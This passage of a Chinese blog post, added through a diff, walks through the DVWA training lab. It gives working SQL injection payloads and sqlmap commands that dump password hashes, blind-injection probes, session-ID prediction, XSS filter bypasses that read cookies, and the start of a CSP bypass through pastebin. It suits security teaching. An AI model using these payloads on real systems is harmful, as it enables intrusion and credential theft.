+// Generate Anti-CSRF token
+generateSessionToken();
+?&gt;
+</code></pre><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="难度：low-6"><a href="#难度：low-6" class="headerlink" title="难度：low"></a>难度：low</h3><ol>
+<li>查看所有信息</li>
+</ol>
+<blockquote>
+<p>输入： 1‘ or 1 = 1#</p>
+</blockquote>
+<pre><code>ID: 1&#39; or 1 = 1#
+First name: admin
+Surname: admin
+ID: 1&#39; or 1 = 1#
+First name: Gordon
+Surname: Brown
+ID: 1&#39; or 1 = 1#
+First name: Hack
+Surname: Me
+ID: 1&#39; or 1 = 1#
+First name: Pablo
+Surname: Picasso
+ID: 1&#39; or 1 = 1#
+First name: Bob
+Surname: Smith
+</code></pre><ol start="2">
+<li>查看有多少列</li>
+</ol>
+<blockquote>
+<p>输入： 1’ order by 3#</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">Unknown column '3' in 'order clause'
+</code></pre>
+<p>ORDER BY x语句用于对结果集的x字段进行排序。输入3后报错，说明获取到的信息是该数据表有两个字段</p>
+<ol start="3">
+<li>使用union爆破数据库</li>
+</ol>
+<blockquote>
+<p>输入： -1’ union select 1, database()#</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">First name: 1
+Surname: dvwa
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_sql_insert_union.png" alt="DVWA"></p>
+<ol start="4">
+<li>获取账号密码</li>
+</ol>
+<blockquote>
+<p>输入：1’ union select user,password from users#</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">ID: 1' union select user,password from users#
+First name: admin
+Surname: admin
+ID: 1' union select user,password from users#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' union select user,password from users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' union select user,password from users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' union select user,password from users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' union select user,password from users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+<h3 id="难度：medium-6"><a href="#难度：medium-6" class="headerlink" title="难度：medium"></a>难度：medium</h3><p><img src="http://alexjakin.github.io/medias/reward/dvwa_sql_insert_md.png" alt="DVWA"></p>
+<p>由于这里不能直接语句输入，但可以采用抓包，我这里进入kali系统用burpsutie抓包分析看看</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_sql_insert_md_bp.png" alt="DVWA"></p>
+<blockquote>
+<p>修改数据包：id=1 and 1 = 1&amp;Submit=Submit</p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_sql_insert_md_bp2.png" alt="DVWA"></p>
+<h3 id="难度：high-6"><a href="#难度：high-6" class="headerlink" title="难度：high"></a>难度：high</h3><p>这。。在新的界面输入内容，点击submit 和low差不多</p>
+<h3 id="扩展使用sqlmap工具"><a href="#扩展使用sqlmap工具" class="headerlink" title="扩展使用sqlmap工具"></a>扩展使用sqlmap工具</h3><p>关于sqlmalp的使用教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52084568/article/details/123839776">点击此处</a></p>
+<ol>
+<li>查看数据库相关信息，添加语句–dbs（查看所有数据库的名称）</li>
+</ol>
+<blockquote>
+<p>输入命令：sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie=”security=low; PHPSESSID=lm02qk2de18gttbgiioh256923” –dbs –batch</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">available databases [5]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+</code></pre>
+<ol start="2">
+<li>添加 –current-db即可查看该数据库名称</li>
+</ol>
+<blockquote>
+<p>输入命令：sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie=”security=low; PHPSESSID=lm02qk2de18gttbgiioh256923” –current-db –batch</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">current database: 'dvwa'
+</code></pre>
+<ol start="3">
+<li>列出dvwa数据库中全部表名<blockquote>
+<p>输入：sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie=”security=low; PHPSESSID=lm02qk2de18gttbgiioh256923” -D dvwa –tables </p>
+</blockquote>
+</li>
+</ol>
+<pre class=" language-text"><code class="language-text">Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+</code></pre>
+<ol start="4">
+<li>解密所有账号并保存</li>
+</ol>
+<blockquote>
+<p>输入：sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://192.168.113.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie=”security=low; PHPSESSID=lm02qk2de18gttbgiioh256923” -D dvwa -T users -C user,password,user_id –dump</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">Database: dvwa                                                                                                
+Table: users
+[5 entries]
++---------+---------------------------------------------+---------+
+| user    | password                                    | user_id |
++---------+---------------------------------------------+---------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | 1       |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   | 2       |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | 3       |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | 4       |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | 5       |
++---------+---------------------------------------------+---------+
+</code></pre>
+<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注</p>
+<p>一般分为：布尔盲注和时间盲注</p>
+<h3 id="难度：low-7"><a href="#难度：low-7" class="headerlink" title="难度：low"></a>难度：low</h3><p>其实就是猜，使用二分法思想去猜</p>
+<p>布尔盲注</p>
+<blockquote>
+<p>1’ and length(database())=1#<br>  1’ and length(database())=2#<br>  1’ andlength(database())=3#<br>  1’ and length(database())=4#<br>  直至猜测长度为4时才返回正常结果</p>
+</blockquote>
+<p>时间盲注</p>
+<blockquote>
+<p>1’ and sleep(5)#</p>
+</blockquote>
+<p>如果不是等待五秒而是马上显示 说明userID 不是数字型可能是字符型</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_blind_time.png" alt="时间盲注"></p>
+<h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><p>简单介绍一下session，当用户登录时，在服务器会生成一个session，之后想访问只需要带着session去访问即可。session作为用户访问站点的需要的唯一内容，绕过能够得到sessionID，那么攻击者将轻松得到访问权限。用户的session一般被加密保存在浏览器的cookie</p>
+<h3 id="难度：low-8"><a href="#难度：low-8" class="headerlink" title="难度：low"></a>难度：low</h3><p>代码审计后可以得到以下信息：</p>
+<ol>
+<li>如果没有 <strong>last_session_id</strong> ，则初始化设置为0</li>
+<li>此后 <strong>last_session_id</strong> 累加，并且将<strong>last_session_id</strong>发送给浏览器端的cookie</li>
+<li>session比较有规律</li>
+</ol>
+<pre><code>&lt;?php
+$html = &quot;&quot;;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123;
+    if (!isset ($_SESSION[&#39;last_session_id&#39;])) &#123;
+        $_SESSION[&#39;last_session_id&#39;] = 0;
+    &#125;
+    $_SESSION[&#39;last_session_id&#39;]++;
+    $cookie_value = $_SESSION[&#39;last_session_id&#39;];
+    setcookie(&quot;dvwaSession&quot;, $cookie_value);
+&#125;
+?&gt; 
+</code></pre><p>使用火狐浏览器（前提还未登录过dvwa）的hackbar，利用上面的session_id规律制造payload</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_session_low_1.png" alt="利用seesion_id的规律"></p>
+<h3 id="难度：medium-7"><a href="#难度：medium-7" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>通过代码审计得到以下信息：</p>
+<ol>
+<li>改进了low难度的session_id加一的规律性，使用将session_id改成了当前时间戳<pre><code>&lt;?php
+$html = &quot;&quot;;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123;
+ $cookie_value = time();
+ setcookie(&quot;dvwaSession&quot;, $cookie_value);
+&#125;
+?&gt;
+</code></pre></li>
+</ol>
+<p>使用当前时间戳来构造payload</p>
+<h3 id="难度：high-7"><a href="#难度：high-7" class="headerlink" title="难度：high"></a>难度：high</h3><p>通过代码审计得到以下信息：</p>
+<ol>
+<li>改进了low难度的session_id加一的规律性，使用md5对session_id加密<pre><code>&lt;?php
+$html = &quot;&quot;;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123;
+ if (!isset ($_SESSION[&#39;last_session_id_high&#39;])) &#123;
+     $_SESSION[&#39;last_session_id_high&#39;] = 0;
+ &#125;
+ $_SESSION[&#39;last_session_id_high&#39;]++;
+ $cookie_value = md5($_SESSION[&#39;last_session_id_high&#39;]);
+ setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], false, false);
+&#125;
+?&gt;
+</code></pre></li>
+</ol>
+<h3 id="难度：impossible-3"><a href="#难度：impossible-3" class="headerlink" title="难度：impossible"></a>难度：impossible</h3><p>代码审计可以得到以下信息：</p>
+<ol>
+<li>session_id使用随机数+时间戳+固定字符串进行sha1运算，完全无法猜测</li>
+</ol>
+<pre><code>&lt;?php
+$html = &quot;&quot;;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot;) &#123;
+    $cookie_value = sha1(mt_rand() . time() . &quot;Impossible&quot;);
+    setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&#39;HTTP_HOST&#39;], true, true);
+&#125;
+?&gt; 
+</code></pre><h2 id="DOM-Based-Cross-Site-Scripting-XSS"><a href="#DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="DOM Based Cross Site Scripting (XSS)"></a>DOM Based Cross Site Scripting (XSS)</h2><h3 id="难度：low-9"><a href="#难度：low-9" class="headerlink" title="难度：low"></a>难度：low</h3><p>地址栏后面加上</p>
+<pre class=" language-html"><code class="language-html"> ?default=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_dom_low.png" alt="xss"></p>
+<p>代码审计后发现：该难度后端没有php校验，执行命令只有客户端</p>
+<h3 id="难度：medium-8"><a href="#难度：medium-8" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>从观察前端代码可知，可以通过闭合标签来执行我们想要的语句</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Select<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+</code></pre>
+<p>所以构造语句闭合标签，进行xss攻击，这里onerror作用是在装载文档或图像的过程中如果发生了错误，就会触发onerror事件，直接调用alert</p>
+<pre class=" language-html"><code class="language-html">><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(/xss/)</span><span class="token punctuation">></span></span>
+
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_dom_md.png" alt="xss"></p>
+<p>代码审计发现: 对<strong><script></strong>进行过滤</p>
+<pre><code>&lt;?php
+
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;
+    $default = $_GET[&#39;default&#39;];
+    # Do not allow script tags
+    if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;
+        header (&quot;location: ?default=English&quot;);
+        exit;
+    &#125;
+&#125;
+?&gt;
+</code></pre><h3 id="难度：high-8"><a href="#难度：high-8" class="headerlink" title="难度：high"></a>难度：high</h3><p>这里难度升级，继续开始构造闭合，这里使用的是用#注释，由于form表单提交的数据，需要先经过JS过滤，所以后面注释部分的javascript代码不会被传到服务器端</p>
+<pre class=" language-html"><code class="language-html">?default=#<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_dom_high.png" alt="xss"></p>
+<p>通过代码审计，查看源码发现设置了白名单，只有白名单中的内容才会被执行。</p>
+<pre><code>&lt;?php
+// Is there any input?
+if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) &#123;
+    # White list the allowable languages
+    switch ($_GET[&#39;default&#39;]) &#123;
+        case &quot;French&quot;:
+        case &quot;English&quot;:
+        case &quot;German&quot;:
+        case &quot;Spanish&quot;:
+            # ok
+            break;
+        default:
+            header (&quot;location: ?default=English&quot;);
+            exit;
+    &#125;
+&#125;
+?&gt;
+</code></pre><h2 id="Reflected-Cross-Site-Scripting-XSS"><a href="#Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="Reflected Cross Site Scripting (XSS)"></a>Reflected Cross Site Scripting (XSS)</h2><h3 id="难度：low-10"><a href="#难度：low-10" class="headerlink" title="难度：low"></a>难度：low</h3><p>直接在输入框输入<em><script>alert(document.cookie)</script></em>，直接拿到cookie</p>
+<p>通过代码审计发现，没有任何限制和过滤</p>
+<pre><code>&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;
+    // Feedback for end user
+    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;
+&#125;
+?&gt;
+</code></pre><h3 id="难度：medium-9"><a href="#难度：medium-9" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>构造payload，有两种：</p>
+<pre class=" language-html"><code class="language-html">1. &lt;scr<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">ipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+2. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCript</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCript</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_r_md.png" alt="xss"></p>
+<p>通过medium代码审计，可以发现该难度做了script标签处理，所以不能直接输入绕过。</p>
+<pre><code>&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;
+    // Get input
+    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+    // Feedback for end user
+    $html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;
+&#125;
+?&gt;
+
+</code></pre><h3 id="难度：high-9"><a href="#难度：high-9" class="headerlink" title="难度：high"></a>难度：high</h3><p>由于服务端做了非常严格的过滤，payload构造相当困难，因此我们直接不使用script，转而使用其他产生xss</p>
+<p>构造payload：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(document.cookie)</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_r_high.png" alt="xss"></p>
+<p>通过high难度的代码审计可以发现，对script标签做了非常严格的过滤，使用了正则表达式</p>
+<pre><code>&lt;?php
+header (&quot;X-XSS-Protection: 0&quot;);
+// Is there any input?
+if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) &#123;
+    // Get input
+    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );
+    // Feedback for end user
+    $html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;
+&#125;
+?&gt;
+</code></pre><h2 id="Stored-Cross-Site-Scripting-XSS"><a href="#Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Stored Cross Site Scripting (XSS)"></a>Stored Cross Site Scripting (XSS)</h2><p>存储型XSS又叫持久型XSS，XSS代码被攻击者存储到服务器中，因此用户在访问含有存储型XSS代码的网站时就会被攻击。</p>
+<h3 id="难度：low-11"><a href="#难度：low-11" class="headerlink" title="难度：low"></a>难度：low</h3><p>这里在前端做了长度限制，我们只需要修改<strong>maxlength</strong>，再输入payload即可</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txtName<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_s_low.png" alt="xss"></p>
+<p>通过代码审计发现，有以下对输入内容检查与限制：</p>
+<ol>
+<li>trim()移除两侧空格</li>
+<li>mysql_real_escape_string()对特殊字符转义</li>
+<li>stripslashes()进行删除\</li>
+</ol>
+<pre><code>&lt;?php
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Sanitize name input
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    //mysql_close();
+&#125;
+?&gt;
+</code></pre><h3 id="难度：medium-10"><a href="#难度：medium-10" class="headerlink" title="难度：medium"></a>难度：medium</h3><p>构造payload，有两种：</p>
+<pre class=" language-html"><code class="language-html">&lt;scr<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">ipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCript</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCript</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>注意修改数据包，将payload放入再发送：</p>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_s_md.png" alt="xss"></p>
+<p>通过代码审计可以发现，除了与low难度的处理一样以外，还做了对script过滤，构造payload和XSS反射型的medium难度一致</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+    //mysql_close();
+&#125;
+
+?&gt;
+
+</code></pre><h3 id="难度：high-10"><a href="#难度：high-10" class="headerlink" title="难度：high"></a>难度：high</h3><p>构造payload和XSS反射型的medium难度一致，由于服务端做了非常严格的过滤，payload构造相当困难，因此我们直接不使用script，转而使用其他产生xss</p>
+<p>注意修改数据包，构造payload放入再发送：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(document.cookie)</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_xss_s_high.png" alt="xss"></p>
+<p>通过代码审计可以发现，和XSS反射型的high难度一样，都是做正则化处理严格处理script，所以构造payload</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
+    // Get input
+    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
+    $name    = trim( $_POST[ &#39;txtName&#39; ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+    //mysql_close();
+&#125;
+
+?&gt;
+
+</code></pre><h2 id="Content-Security-Policy-CSP-Bypass"><a href="#Content-Security-Policy-CSP-Bypass" class="headerlink" title="Content Security Policy (CSP) Bypass"></a>Content Security Policy (CSP) Bypass</h2><p>开发者在开发过程中设置了一个类似于白名单的策略，要信任某个页面，哪些外部资源可以执行，哪些不可以，这可以从根本上防御XSS，如果CSP配置的好，可以从根本上杜绝XSS</p>
+<h3 id="难度：low-12"><a href="#难度：low-12" class="headerlink" title="难度：low"></a>难度：low</h3><p>抓包分析可以发现白名单，在pastebin.com写一个JavaScript脚本，生成链接后，再去dvwa执行即可。因为<a target="_blank" rel="noopener" href="https://pastebin.com/是被信任的所以会执行，若不在白名单里是不会被执行的如下：">https://pastebin.com/是被信任的所以会执行，若不在白名单里是不会被执行的如下：</a></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://pastebin.com/raw/sD9vUGxE">https://pastebin.com/raw/sD9vUGxE</a></p>
+</blockquote>
+<p><img src="http://alexjakin.github.io/medias/reward/dvwa_csp_low_1.png" alt="通过抓包分析CSP漏洞"></p>
+<p>代码审计可以得到以下信息：</p>
+<ol>
+<li>有以下外部资源可以被执行<ul>
+<li><a target="_blank" rel="noopener" href="https://pastebin.com">https://pastebin.com</a></li>
+<li>hastebin.com</li>
+<li>example.com</li>
+<li>code.jquery.com</li>
+<li><a target="_blank" rel="noopener" href="https://ssl.google-analytics.com">https://ssl.google-analytics.com</a></li>
+</ul>
+</li>
+</ol>
+<pre><code>&lt;?php
+
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
+header($headerCSP);
+# These might work if you can&#39;t create your own for some reason
+# https://pastebin.com/raw/R570EE00
+# https://hastebin.com/raw/ohulaquzex
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
